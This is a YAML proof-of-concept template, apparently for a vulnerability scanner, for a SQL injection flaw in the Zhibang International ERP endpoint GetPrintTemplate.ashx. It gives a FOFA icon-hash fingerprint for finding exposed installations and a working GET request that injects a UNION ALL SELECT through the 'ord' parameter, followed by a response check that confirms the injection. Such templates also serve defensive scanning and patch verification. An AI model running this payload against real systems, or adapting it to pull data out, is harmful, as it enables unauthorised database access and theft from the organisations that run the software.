id: poc-yaml-zbintel-erp-getprinttemplate-sqli
info:
  name: 智邦国际ERP GetPrintTemplate SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: 智邦国际ERP
  fofa: icon_hash="-682445886"
variables:
  t1: random_int(1000,10000)
  t2: md5(t1)
requests:
- method: GET
  path: /SYSN/json/pcclient/GetPrintTemplate.ashx?sort=1&ord=-1+UNION+ALL+SELECT+NULL%2Csys.fn_varbintohexstr(hashbytes('MD5','{{.t1}}'))%2CNULL%2CNULL%2CNULL--+vlPx
  expression: status_code == 200 && contains(body,"转换成数据类型") && contains(body,"SQL")
    && contains(body,"0x" + t2) && contains(content_type,"application/json")
transport: http
